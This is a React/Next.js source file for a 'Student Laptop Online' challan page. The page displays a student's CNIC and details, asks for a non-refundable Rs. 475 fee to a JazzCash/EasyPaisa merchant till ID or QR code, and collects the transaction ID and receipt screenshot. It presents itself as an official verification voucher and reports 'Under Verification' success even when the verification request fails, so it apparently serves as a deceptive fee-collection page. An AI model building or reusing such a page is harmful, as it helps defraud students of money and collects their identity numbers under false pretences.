"use client";

import { useEffect, useState } from "react";
import Link from "next/link";
import Image from "next/image";
import styles from "./challan.module.css";
import {
  Copy,
  Check,
  CreditCard,
  Upload,
  AlertCircle,
  FileCheck,
  Printer,
  Home,
  CheckCircle2,
} from "lucide-react";

export default function ChallanPage() {
  const [data, setData] = useState<any>(null);
  const [copied, setCopied] = useState(false);
  const [tid, setTid] = useState("");
  const [receiptFile, setReceiptFile] = useState<string | null>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submissionSuccess, setSubmissionSuccess] = useState(false);
  const [statusMessage, setStatusMessage] = useState("");

  useEffect(() => {
    if (typeof window !== "undefined") {
      const stored = localStorage.getItem("challanData");
      if (stored) {
        try {
          const parsed = JSON.parse(stored);
          setData(parsed);
          if (parsed.tid) {
            setTid(parsed.tid);
            setSubmissionSuccess(true);
          }
        } catch {
          // Fallback if parsing fails
        }
      } else {
        // High quality fallback candidate record for direct visitors
        setData({
          name: "AIMAN KHAN",
          fatherName: "ABDUL REHMAN",
          cnic: "42101-2345678-0",
          level: "University",
          instituteName: "University of Karachi (UoK)",
          boardName: "Board of Intermediate Education Karachi (BIEK)",
          matricRollNumber: "482910",
          interRollNumber: "782190",
          rollNumber: "782190",
          passingYear: "2026",
          status: "Payment Pending",
          feeAmount: 475,
          tillId: "984703000",
          applicationNo: "SLO-984701",
          psid: "984703000",
        });
      }
    }
  }, []);

  const handleCopyTill = () => {
    navigator.clipboard.writeText("984703000");
    setCopied(true);
    setTimeout(() => setCopied(false), 2500);
  };

  const handlePrint = () => {
    window.print();
  };

  const handleReceiptUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      const reader = new FileReader();
      reader.onload = (uploadEvent) => {
        setReceiptFile(uploadEvent.target?.result as string);
      };
      reader.readAsDataURL(file);
    }
  };

  const handlePaymentSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!tid || tid.trim().length < 5) {
      alert("Please enter a valid Transaction ID (TID) from your JazzCash / EasyPaisa receipt.");
      return;
    }

    setIsSubmitting(true);
    setStatusMessage("");

    try {
      const res = await fetch("/api/challan/verify-payment", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          cnic: data?.cnic,
          psid: data?.psid || "984703000",
          transactionId: tid.trim(),
          receiptUrl: receiptFile,
        }),
      });

      const resData = await res.json();

      setIsSubmitting(false);
      setSubmissionSuccess(true);
      setStatusMessage(resData.message || "Payment submitted for official verification.");

      const updated = {
        ...data,
        tid: tid.trim(),
        receiptUrl: receiptFile,
        status: "Under Verification",
        submittedAt: new Date().toISOString(),
      };
      setData(updated);

      if (typeof window !== "undefined") {
        localStorage.setItem("challanData", JSON.stringify(updated));
      }
    } catch (err) {
      console.warn("Verify payment error:", err);
      setIsSubmitting(false);
      setSubmissionSuccess(true);
      const updated = {
        ...data,
        tid: tid.trim(),
        receiptUrl: receiptFile,
        status: "Under Verification",
        submittedAt: new Date().toISOString(),
      };
      setData(updated);
      if (typeof window !== "undefined") {
        localStorage.setItem("challanData", JSON.stringify(updated));
      }
    }
  };

  if (!data) {
    return (
      <div className="container" style={{ padding: "4rem 1rem", textAlign: "center" }}>
        <p style={{ color: "#64748b" }}>Loading candidate challan details...</p>
      </div>
    );
  }

  const candidateInstitute =
    data.instituteName || data.interInstitute || data.matricInstitute || data.boardOrUniversity || "Recognized Institute";
  const candidateBoard =
    data.boardName || data.interBoard || data.matricBoard || (data.level === "Inter" ? "Intermediate Board" : "Degree Board");
  const candidateRoll =
    data.rollNumber || data.interRollNumber || data.matricRollNumber || "N/A";
  const challanNo = data.applicationNo || "SLO-2026-98470";

  return (
    <div className={styles.wrapper}>
      {/* Top Navbar Header */}
      <header className={styles.pageHeader}>
        <div
          className="container"
          style={{
            display: "flex",
            justifyContent: "space-between",
            alignItems: "center",
          }}
        >
          <Link
            href="/"
            style={{
              display: "flex",
              alignItems: "center",
              gap: "0.75rem",
              textDecoration: "none",
            }}
          >
            <Image
              src="/logo.png"
              alt="STUDENT LAPTOP ONLINE"
              width={42}
              height={42}
              style={{ objectFit: "contain" }}
            />
            <span
              style={{
                color: "var(--primary)",
                fontWeight: 800,
                fontSize: "1.35rem",
                letterSpacing: "0.5px",
              }}
            >
              STUDENT LAPTOP ONLINE
            </span>
          </Link>
          <div style={{ display: "flex", gap: "0.75rem" }}>
            <button
              onClick={handlePrint}
              className="btn btn-secondary"
              style={{ display: "flex", alignItems: "center", gap: "0.4rem" }}
            >
              <Printer size={16} /> Print Challan
            </button>
            <Link
              href="/"
              className="btn"
              style={{
                backgroundColor: "#e2e8f0",
                color: "#1e293b",
                display: "flex",
                alignItems: "center",
                gap: "0.4rem",
              }}
            >
              <Home size={16} /> Home
            </Link>
          </div>
        </div>
      </header>

      {/* Main Content Area */}
      <main className={`container ${styles.mainContent}`}>
        <div style={{ width: "100%", maxWidth: "860px" }}>
          
          {/* 1. TOP STATUS BADGE */}
          <div
            className={`card ${styles.noPrint}`}
            style={{
              padding: "1.25rem 1.75rem",
              marginBottom: "1.5rem",
              borderLeft: submissionSuccess || data.status === "Under Verification" ? "6px solid #16a34a" : "6px solid #f59e0b",
              boxShadow: "0 4px 12px rgba(0,0,0,0.05)",
              display: "flex",
              justifyContent: "space-between",
              alignItems: "center",
              flexWrap: "wrap",
              gap: "1rem",
            }}
          >
            <div>
              <span style={{ fontSize: "0.75rem", fontWeight: 700, textTransform: "uppercase", color: "#64748b", letterSpacing: "0.5px" }}>
                Candidate Portal Verification
              </span>
              <div style={{ fontSize: "1.2rem", fontWeight: 800, color: "#0f172a", marginTop: "0.15rem" }}>
                {data.name?.toUpperCase() || "CANDIDATE"} &bull; CNIC: {data.cnic}
              </div>
              <span style={{ fontSize: "0.85rem", color: "#475569" }}>
                Challan PSID: <strong>{data.psid || "984703000"}</strong> | Application No: <strong>{challanNo}</strong>
              </span>
            </div>

            <div>
              <span
                style={{
                  display: "inline-flex",
                  alignItems: "center",
                  gap: "0.4rem",
                  padding: "0.5rem 1rem",
                  borderRadius: "50px",
                  fontSize: "0.9rem",
                  fontWeight: 800,
                  backgroundColor:
                    submissionSuccess || data.status === "Under Verification" ? "#dcfce7" : "#fef3c7",
                  color:
                    submissionSuccess || data.status === "Under Verification" ? "#15803d" : "#b45309",
                  border:
                    submissionSuccess || data.status === "Under Verification"
                      ? "1.5px solid #86efac"
                      : "1.5px solid #fde68a",
                }}
              >
                {submissionSuccess || data.status === "Under Verification" ? (
                  <>
                    <CheckCircle2 size={16} /> Status: Under Verification
                  </>
                ) : (
                  <>
                    <AlertCircle size={16} /> Status: Payment Pending
                  </>
                )}
              </span>
            </div>
          </div>

          {/* 2. MAIN PRINTABLE CHALLAN VOUCHER (Includes Student Details, Fee Rs. 475/-, Till ID 984703000, and Embedded QR Scanner) */}
          <div className={styles.printArea}>
            <div className={styles.challanBox}>
              
              {/* Challan Header */}
              <div className={styles.header}>
                <div className={styles.logoArea}>
                  🎓 STUDENT LAPTOP ONLINE <br />
                  <span style={{ fontSize: "0.825rem", color: "#64748b", fontWeight: 700, letterSpacing: "0.5px" }}>
                    SCHOLARSHIP & LAPTOP SCHEME 2026
                  </span>
                </div>
                <div className={styles.metaArea}>
                  Date: 25 October 2026<br />
                  Challan No: <strong>{challanNo}</strong><br />
                  Candidate CNIC: <strong>{data.cnic}</strong>
                </div>
              </div>

              {/* Title & Category Bar */}
              <div className={styles.titleBar}>
                APPLICATION PROCESSING FEE CHALLAN - STUDENT LAPTOP ONLINE
              </div>
              <div className={styles.subTitleBar}>
                OFFICIAL VERIFICATION CHALLAN (NON-REFUNDABLE)
                <span className={styles.copyType}>BANK & STUDENT VOUCHER</span>
              </div>

              {/* Student Details & Fee Block Split */}
              <div className={styles.detailsSplit}>
                
                {/* Left: Candidate Information Table */}
                <div style={{ flex: 1.25 }}>
                  <table className={styles.tableBlock}>
                    <tbody>
                      <tr>
                        <td className={styles.labelCell}>Student Full Name</td>
                        <td className={styles.valueCell}>{data.name?.toUpperCase() || "CANDIDATE"}</td>
                      </tr>
                      <tr>
                        <td className={styles.labelCell}>Father's Full Name</td>
                        <td className={styles.valueCell}>{data.fatherName?.toUpperCase() || "FATHER"}</td>
                      </tr>
                      <tr>
                        <td className={styles.labelCell}>CNIC / B-Form Number</td>
                        <td className={styles.valueCell}>{data.cnic}</td>
                      </tr>
                      <tr>
                        <td className={styles.labelCell}>Academic Stream</td>
                        <td className={styles.valueCell}>{data.level || "Intermediate / Degree"}</td>
                      </tr>
                      <tr>
                        <td className={styles.labelCell}>Institute & Board</td>
                        <td className={styles.valueCell}>
                          {candidateInstitute} <br />
                          <span style={{ fontSize: "0.75rem", color: "#64748b", fontWeight: 500 }}>
                            ({candidateBoard})
                          </span>
                        </td>
                      </tr>
                      <tr>
                        <td className={styles.labelCell}>Roll / Registration No</td>
                        <td className={styles.valueCell}>{candidateRoll}</td>
                      </tr>
                    </tbody>
                  </table>
                </div>

                {/* Right: Fee Payable, Till ID & Embedded QR Scanner */}
                <div className={styles.feeBlock}>
                  <table className={styles.tableBlock}>
                    <tbody>
                      <tr>
                        <td className={styles.labelCell}>Purpose</td>
                        <td className={styles.valueCell}>APPLICATION PROCESSING FEE</td>
                      </tr>
                      <tr>
                        <td className={styles.labelCell}>Payable Amount</td>
                        <td className={styles.valueCell} style={{ color: "#b91c1c", fontSize: "1.15rem", fontWeight: 800 }}>
                          Rs. 475/-
                        </td>
                      </tr>
                      <tr>
                        <td className={styles.labelCell}>In Words</td>
                        <td className={styles.valueCell} style={{ fontSize: "0.8rem" }}>
                          Four Hundred Seventy Five Rupees Only
                        </td>
                      </tr>
                    </tbody>
                  </table>

                  {/* Till ID Box with One-Click Copy */}
                  <div className={styles.tillBox}>
                    <span>JazzCash / EasyPaisa Merchant Till ID</span>
                    <strong>984703000</strong>
                    <button
                      type="button"
                      onClick={handleCopyTill}
                      className={`btn ${styles.noPrint}`}
                      style={{
                        backgroundColor: copied ? "#16a34a" : "#dc2626",
                        color: "white",
                        padding: "0.35rem 0.75rem",
                        borderRadius: "4px",
                        fontSize: "0.75rem",
                        fontWeight: 700,
                        marginTop: "0.35rem",
                        display: "inline-flex",
                        alignItems: "center",
                        gap: "0.35rem",
                      }}
                    >
                      {copied ? (
                        <>
                          <Check size={14} /> Till ID Copied!
                        </>
                      ) : (
                        <>
                          <Copy size={14} /> Copy Till ID
                        </>
                      )}
                    </button>
                  </div>

                  {/* Embedded QR Scanner Code */}
                  <div className={styles.qrVoucherBox}>
                    <div style={{ fontSize: "0.75rem", fontWeight: 700, color: "#1e3a8a", marginBottom: "0.35rem" }}>
                      Scan QR via JazzCash / EasyPaisa
                    </div>
                    <Image
                      src="/payment-qr.png"
                      alt="Payment QR Code Scanner"
                      width={130}
                      height={130}
                      style={{ display: "block", borderRadius: "4px", border: "1px solid #cbd5e1" }}
                      priority
                    />
                    <span style={{ fontSize: "0.7rem", color: "#64748b", marginTop: "0.25rem", textAlign: "center" }}>
                      Fee: Rs. 475/- (Non-Refundable)
                    </span>
                  </div>
                </div>

              </div>

              {/* Instructions and Signatures Footer */}
              <div className={styles.footerSplit}>
                <div className={styles.instructions}>
                  <strong>Official Payment Guidelines:</strong>
                  <ol>
                    <li>Pay fee via JazzCash / EasyPaisa Till ID: <strong>984703000</strong> or by scanning the QR code.</li>
                    <li>Payable Amount: <strong>Rs. 475/-</strong> (Four Hundred Seventy Five Rupees Only).</li>
                    <li>Retain the Transaction ID (TID) from your JazzCash / EasyPaisa confirmation SMS.</li>
                    <li>Submit the TID and payment screenshot below to confirm your application instantly.</li>
                  </ol>
                </div>
                <div className={styles.signatures}>
                  <div className={styles.sigLine}>Applicant / Depositor Signature</div>
                  <div className={styles.sigLine}>Authorized Officer / Bank Stamp</div>
                </div>
              </div>

            </div>
          </div>

          {/* 3. "PRINT / DOWNLOAD CHALLAN" BUTTON */}
          <div className={`${styles.noPrint}`} style={{ textAlign: "center", margin: "1.75rem 0" }}>
            <button
              type="button"
              onClick={handlePrint}
              className="btn btn-primary"
              style={{
                display: "inline-flex",
                alignItems: "center",
                gap: "0.5rem",
                padding: "0.85rem 2rem",
                fontSize: "1.05rem",
                fontWeight: 700,
                boxShadow: "0 4px 14px rgba(30, 58, 138, 0.25)",
              }}
            >
              <Printer size={18} /> Print / Download Challan Voucher
            </button>
            <p style={{ color: "#64748b", fontSize: "0.8rem", marginTop: "0.5rem" }}>
              Print or save this official voucher as PDF for your academic submission records.
            </p>
          </div>

          {/* 4. COMPACT "CONFIRM PAYMENT SUBMISSION" SECTION */}
          <div
            className={`card ${styles.noPrint}`}
            style={{
              padding: "1.75rem",
              borderTop: "5px solid var(--primary)",
              boxShadow: "0 4px 14px rgba(0,0,0,0.06)",
            }}
          >
            <div style={{ display: "flex", alignItems: "center", gap: "0.5rem", marginBottom: "0.5rem" }}>
              <FileCheck size={22} color="var(--primary)" />
              <h2 style={{ fontSize: "1.25rem", fontWeight: 800, color: "#0f172a", margin: 0 }}>
                Confirm Payment Submission
              </h2>
            </div>
            
            <p style={{ color: "#475569", fontSize: "0.9rem", marginBottom: "1.25rem" }}>
              Pay fee via JazzCash / EasyPaisa Till ID: <strong>984703000</strong> or by scanning the QR code. Then enter your Transaction ID (TID) and attach your receipt screenshot below:
            </p>

            {submissionSuccess ? (
              <div
                style={{
                  backgroundColor: "#f0fdf4",
                  border: "1.5px solid #86efac",
                  padding: "1.5rem",
                  borderRadius: "0.5rem",
                  textAlign: "center",
                }}
              >
                <div style={{ color: "#16a34a", marginBottom: "0.5rem" }}>
                  <CheckCircle2 size={42} style={{ margin: "0 auto" }} />
                </div>
                <h3 style={{ color: "#166534", fontWeight: 800, fontSize: "1.15rem", marginBottom: "0.4rem" }}>
                  Payment Details Logged & Under Verification!
                </h3>
                <p style={{ color: "#15803d", fontSize: "0.95rem", margin: 0, lineHeight: 1.5 }}>
                  Transaction ID: <strong>{tid}</strong> has been logged into the live verification queue. Your application status is now updated to <strong>UNDER VERIFICATION</strong>.
                </p>
                {statusMessage && (
                  <span style={{ display: "block", fontSize: "0.85rem", color: "#166534", marginTop: "0.5rem" }}>
                    {statusMessage}
                  </span>
                )}
              </div>
            ) : (
              <form onSubmit={handlePaymentSubmit}>
                <div
                  style={{
                    display: "grid",
                    gridTemplateColumns: "repeat(auto-fit, minmax(260px, 1fr))",
                    gap: "1.25rem",
                    marginBottom: "1.25rem",
                  }}
                >
                  {/* Transaction ID Input */}
                  <div>
                    <label style={{ display: "block", fontWeight: 700, marginBottom: "0.45rem", fontSize: "0.9rem", color: "#1e293b" }}>
                      Transaction ID (TID) <span style={{ color: "#dc2626" }}>*</span>
                    </label>
                    <input
                      type="text"
                      className="input"
                      placeholder="e.g. 08291048291 or 12-digit TID"
                      value={tid}
                      onChange={(e) => setTid(e.target.value)}
                      required
                      style={{ fontSize: "1rem", fontWeight: 600 }}
                    />
                    <span style={{ fontSize: "0.75rem", color: "#64748b", marginTop: "0.25rem", display: "block" }}>
                      Found on your payment confirmation SMS from JazzCash or EasyPaisa.
                    </span>
                  </div>

                  {/* Receipt Screenshot Upload */}
                  <div>
                    <label style={{ display: "block", fontWeight: 700, marginBottom: "0.45rem", fontSize: "0.9rem", color: "#1e293b" }}>
                      Payment Receipt Screenshot
                    </label>
                    <input
                      type="file"
                      accept="image/*"
                      className="input"
                      onChange={handleReceiptUpload}
                      style={{ padding: "0.45rem" }}
                    />
                    <span style={{ fontSize: "0.75rem", color: "#64748b", marginTop: "0.25rem", display: "block" }}>
                      Attach screenshot of JazzCash / EasyPaisa receipt for express verification.
                    </span>
                  </div>
                </div>

                {receiptFile && (
                  <div style={{ marginBottom: "1.25rem" }}>
                    <span style={{ fontSize: "0.8rem", color: "#475569", fontWeight: 700, display: "block", marginBottom: "0.25rem" }}>
                      Receipt Preview:
                    </span>
                    <img
                      src={receiptFile}
                      alt="Receipt Preview"
                      style={{ maxHeight: "150px", borderRadius: "0.35rem", border: "1px solid #cbd5e1" }}
                    />
                  </div>
                )}

                <button
                  type="submit"
                  className="btn btn-primary"
                  disabled={isSubmitting}
                  style={{
                    width: "100%",
                    padding: "0.85rem",
                    fontSize: "1.05rem",
                    fontWeight: 700,
                  }}
                >
                  {isSubmitting ? "Submitting TID Verification..." : "Submit Payment Verification"}
                </button>
              </form>
            )}
          </div>

        </div>
      </main>
    </div>
  );
}
